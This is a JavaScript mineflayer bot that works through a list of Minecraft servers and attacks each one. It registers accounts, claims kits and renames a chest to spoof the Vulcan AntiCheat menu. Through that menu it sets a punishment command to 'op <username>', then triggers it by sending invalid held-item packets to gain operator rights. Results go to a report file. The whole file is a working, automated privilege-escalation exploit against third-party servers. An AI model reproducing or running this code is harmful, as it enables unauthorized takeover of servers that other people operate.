const mineflayer = require("mineflayer");
const { pathfinder, Movements, goals } = require("mineflayer-pathfinder");
const logger = require("pino")();
const fs = require("fs");
const randomstring = require("randomstring");
const { Vec3 } = require("vec3");

const config = require("./config.json");
const servers = require("./servers.json");

logger.info("Imports done, starting bot...");

const LOGFILE = config.logto;

logger.info("Logging to " + LOGFILE);

if(!fs.existsSync(LOGFILE)) {
    fs.writeFileSync(LOGFILE, "");
}

const handleErr = e => logger.warn("Uncaught error: " + e?.stack);
process.on("uncaughtException", handleErr);
process.on("unhandledRejection", handleErr);

const timeoutErrorPromise = ms => new Promise((_, reject) => setTimeout(reject, ms, new Error("Timeout after " + ms + " ms")));
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const name = "Vulcan AntiCheat";

const useAnvil = async (bot, newBlock) => {
    const anvil = await bot.openBlock(newBlock);
    await sleep(201);
    if (bot.supportFeature("useMCItemName")) {
        bot._client.registerChannel("MC|ItemName", "string")
    }
    const chestsItem = bot.inventory.items().find(item => item.name === "chest");
    const sendItemName = name => {
        if (bot.supportFeature("useMCItemName")) {
            bot._client.writeChannel("MC|ItemName", name);
        } else {
            bot._client.write("name_item", { name });
        }
    }
    const addCustomName = async name => {
        for (let i = 1; i < name.length + 1; i++) {
            sendItemName(name.substring(0, i));
            await sleep(50);
        }
    }
    const putSomething = async (slot, itemId, metadata, count, nbt) => {
        const options = {
            "window": anvil,
            "itemType": itemId,
            metadata,
            count,
            nbt,
            "sourceStart": anvil.inventoryStart,
            "sourceEnd": anvil.inventoryEnd,
            "destStart": slot,
            "destEnd": slot + 1
        };
        await bot.transfer(options);
    }
    await putSomething(0, chestsItem.type, chestsItem.metadata, chestsItem.count, chestsItem.nbt);
    sendItemName("");
    if (!bot.supportFeature("useMCItemName")) sendItemName("");
    await addCustomName(name);
    await sleep(1700);
    await bot.putAway(2);
    await bot.currentWindow.close();
    await sleep(510);
}

const sendInvalidPacket = async bot => {
    await bot._client.write("held_item_slot", { "slotId": -1 });
}

const setErrorHandler = bot => {
    bot.on("error", () => null);
}

const checkServer = async server => {
    logger.info("Starting bot...");
    const username = server.username || randomstring.generate(10);
    const password = server.password || randomstring.generate(10);
    const ip = server.ip;
    const port = server.port || 25565;
    const version = server.version || false;
    logger.info("Server IP: " + ip);
    logger.info("Port: " + port);
    logger.info("Username: " + username);
    logger.info("Password: " + password);
    logger.info("Version: " + (version ? version : "auto"));

    let certainity = 0;
    let hasVulcan = false;
    let canObtain = false;

    const opts = {
        host: ip,
        port: port,
        username: username
    };
    let bot = mineflayer.createBot(opts);
    setErrorHandler(bot);
    bot.loadPlugin(pathfinder);
    logger.info("Bot started!");

    let loggedIn = false;
    let handleEnd = true;

    bot.once("login", () => { loggedIn = true });
    bot.once("end", () => {
        try {
            if(!handleEnd) return;
            bot = mineflayer.createBot(opts);
            setErrorHandler(bot);
            bot.once("login", () => { loggedIn = true });
            bot.loadPlugin(pathfinder);
            logger.info("REstarted!");
        } catch(_) {}
    });

    await Promise.race([
        new Promise(resolve => {
            const check = () => {
                if(loggedIn) resolve();
                else setTimeout(check, 1);
            }
            check();
        }),
        timeoutErrorPromise(5000)
    ]);
    handleEnd = false;
    logger.info("Logged in!");

    await sleep(20000);
    /* bot.on("messagestr", msg => {
        logger.info("AAA DEBUG " + msg);
    }); */

    logger.info("Registering using /reg...");
    bot.chat("/register " + password + " " + password);
    await sleep(2998);
    bot.chat("/login " + password);
    await sleep(3000);
    logger.info("Registered and logged in!");

    logger.info("Getting the starter and the bonus kits...");
    bot.chat("/kit start");
    await sleep(3003);
    bot.chat("/kit bonus");
    await sleep(3004);
    logger.info("Got the kits!");

    logger.info("Trying to see what plugins we have...");
    bot.chat("/plugins");
    let plugins = "";
    bot.on("messagestr", msg => {
        plugins += msg;
    });
    await sleep(2000);
    logger.info("Done checking plugins!");
    if(plugins.includes("Vulcan")) {
        logger.info("Vulcan detected!");
        certainity += 0.2;
        hasVulcan = true;
    }

    let xpbottle;

    await sleep(1000);
    logger.info("Trying to find an anvil warp and use the anvil...");
    for(let i of [
        "enchant",
        "anvil",
        "char"
    ]) {
        await bot.chat("/warp " + i);
        await sleep(3100);
    }
    logger.info("Done checking the warps, looking for the anvil now...");
    const anvil0 = bot.findBlock({
        "matching": block => (
            block && block.position
            && (
                block.name === "anvil"
                || block.name === "chipped_anvil"
                || block.name === "damaged_anvil"
            )
        ),
        "distance": 15,
        "useExtraInfo": true
    });
    let foundAnvil = false;
    if(anvil0) {
        logger.info("Found an anvil!");
        foundAnvil = true;
        const movements = new Movements(bot);
        bot.pathfinder.setMovements(movements);
        bot.pathfinder.setGoal(new goals.GoalLookAtBlock(anvil0.position, bot.world));
        await new Promise(resolve => bot.on("goal_reached", resolve));
        xpbottle = bot.inventory.items().find(item => item.name === "experience_bottle");
        if(xpbottle) {
            await bot.equip(xpbottle);
            await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
            await sleep(500);
            for(let i = 0; i < 6; i++) {
                await bot.activateItem();
                await sleep(501);
            }
        }
        await useAnvil(bot, anvil0);
    }

    await sleep(3001);
    logger.info("Teleporting to a random location...");
    bot.chat("/rtp");
    await sleep(10000);

    logger.info("Checking the inventory for necessary items...");
    const inventory = bot.inventory.slots;
    let chestAmount = 0;
    let hasAnvil = false, hasTwoChests = false;
    hasAnvil = bot.inventory.items().filter(item => item.name === "anvil"
        || item.name === "chipped_anvil"
        || item.name === "damaged_anvil").length > 0;
    hasTwoChests = bot.inventory.items().filter(item => item.name === "chest" || item.name === "trapped_chest").reduce((all, cur) => all + cur.count, 0) >= 2;
    if(chestAmount >= 2)
        hasTwoChests = true;
    if((hasAnvil || foundAnvil) && hasTwoChests) {
        logger.info("We have an anvil and two chests!");
        logger.info("Trying to perform the exploit...");
        await bot.waitForChunksToLoad();
        if(!foundAnvil) {
            xpbottle = bot.inventory.items().find(item => item.name === "experience_bottle");
            if(xpbottle) {
                await bot.equip(xpbottle);
                await bot.lookAt(bot.entity.position.plus(new Vec3(0, -1, 0)));
                await sleep(500);
                for(let i = 0; i < 6; i++) {
                    await bot.activateItem();
                    await sleep(501);
                }
            }
            let block = await bot.findBlock({
                "matching": block => (
                    block && block.position
                    && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
                    && block.boundingBox == "block"
                ),
                "useExtraInfo": true,
                "distance": 3
            });
            await bot.equip(bot.inventory.items().find(item => item.name === "anvil"
                || item.name === "chipped_anvil"
                || item.name === "damaged_anvil"));
            await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
            await bot.placeBlock(block, new Vec3(0, 1, 0));
            let newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
            await bot.lookAt(newBlock.position);
            await sleep(200);
            // const anvil = await bot.openAnvil(newBlock);
            await useAnvil(bot, newBlock);
            // await anvil.shiftClick({ "mouseButton": 0, "slot": 2 })
            // await anvil.rename(bot.inventory.items().find(item => item.name === "chest"), "Vulcan AntiCheat");
        }
        await sleep(1200);
        block = await bot.findBlock({
            "matching": block => (
                block && block.position
                && (block.position.x != Math.floor(bot.entity.position.x) || block.position.z != Math.floor(bot.entity.position.z))
                && block.boundingBox == "block"
                && bot.blockAt(block.position.plus(new Vec3(0, 1, 0))).name === "air"
                && block.name !== "anvil"
            ),
            "useExtraInfo": true,
            "distance": 3
        });
        await bot.equip(bot.inventory.items().find(item => item.name === "chest"));
        await sleep(209);
        await bot.lookAt(block.position.plus(new Vec3(0, 0.5, 0)));
        await sleep(1007);
        await bot.placeBlock(block, new Vec3(0, 1, 0));
        newBlock = bot.blockAt(block.position.plus(new Vec3(0, 1, 0)));
        await bot.lookAt(newBlock.position);
        await sleep(1008);
        const chest = await bot.openChest(newBlock);
        await sleep(1507);
        try { await bot.clickWindow(chest.slots.find(item => item && item.customName == name).slot, 0, 0); } catch(e) {
            logger.warn("Non-fatal error while clickin on an item a: " + e.stack)
        }
        await sleep(1503);
        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.name == "apple").slot); } catch(e) {
            logger.warn("Non-fatal error while clickin on an item b: " + e.stack)
        }
        await sleep(1504);
        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.customName.includes("Bad Packets (Type O)")).slot); } catch(e) {
            logger.warn("Non-fatal error while clickin on an item c: " + e.stack)
        }
        await sleep(1505);
        try { await bot.simpleClick.rightMouse(bot.currentWindow.slots.find(item => item && item.customName.includes("Set Punishment Commands")).slot); } catch(e) {
            logger.warn("Non-fatal error while clickin on an item d: " + e.stack)
        }
        await sleep(1506);
        await bot.chat("0");
        await sleep(1507);
        try { await bot.simpleClick.leftMouse(bot.currentWindow.slots.find(item => item && item.customName.includes("Set Punishment Commands")).slot); } catch(e) {
            logger.warn("Non-fatal error while clickin on an item e: " + e.stack)
        }
        await sleep(1508);
        await bot.chat("op " + username);
        await sleep(507);
        await bot.currentWindow.close();
        await sleep(511);
        logger.info("Started checking the exploit...");
        const prom1 = new Promise(resolve => {
            bot.on("end", async () => {
                try {
                    const bot = mineflayer.createBot(opts);
                    setErrorHandler(bot);
                    await Promise.race([
                        new Promise(resolve => bot.once("login", resolve)),
                        timeoutErrorPromise(5000)
                    ]);
                    bot.chat("/login " + password);
                    await sleep(3000);
                    await bot.chat("/gamemode 1");
                    await sleep(3005);
                    await bot.chat("/gamemode creative");
                    await sleep(508);
                    if(bot.game.gameMode == "creative") {
                        logger.info("Able to obtain OP!!!");
                        certainity += 0.8;
                        canObtain = true;
                    }
                    resolve();
                } catch(e) {
                    logger.warn("Non-fatal error on checking stage prom1: " + e.stack);
                }
            });
        });
        const prom2 = new Promise(async resolve => {
            let cont = true;
            bot.on("end", () => { cont = false });
            try {
                await sleep(2500);
                if(!cont) return;
                await bot.chat("/gamemode 1");
                if(!cont) return;
                await sleep(3005);
                if(!cont) return;
                await bot.chat("/gamemode creative");
                if(!cont) return;
                await sleep(508);
                if(!cont) return;
                if(bot.game.gameMode == "creative") {
                    logger.info("Able to obtain OP!!!");
                    certainity += 0.8;
                    canObtain = true;
                }
                if(!cont) return;
                resolve();
            } catch(e) {
                logger.warn("Non-fatal error on checking stage prom1: " + e.stack);
            }
        });
        for(let i = 0; i < 25; i++)
            await sendInvalidPacket(bot);
        await Promise.race([prom1, prom2]);
    }

    await sleep(1000);
    await bot.quit();
    logger.info("Making a report now...");
    fs.appendFileSync(LOGFILE, `Report for bot ${username}:

Password: ${password}
Server: ${ip}:${port}
Overall vulnerability certainity: ${certainity}
Has Vulcan: ${hasVulcan}
Was able to obtain OP: ${canObtain}

`);
    logger.info("Bot " + username + " done with certainity " + certainity + ", thank you!");
}

// TODO: proper threading
const worker = async () => {
    while(servers.length > 0) {
        const server = servers.shift();
        try {
            await Promise.race([
                checkServer(server),
                timeoutErrorPromise(300000) // 5 min
            ]);
        } catch(e) {
            logger.error("A bot for " + server.ip + " threw an error: " + e.stack);
        }
    }
}

(async () => {
    for(let i = 0; i < Math.min(config.threads, servers.length); i++)
        setTimeout(worker);
})();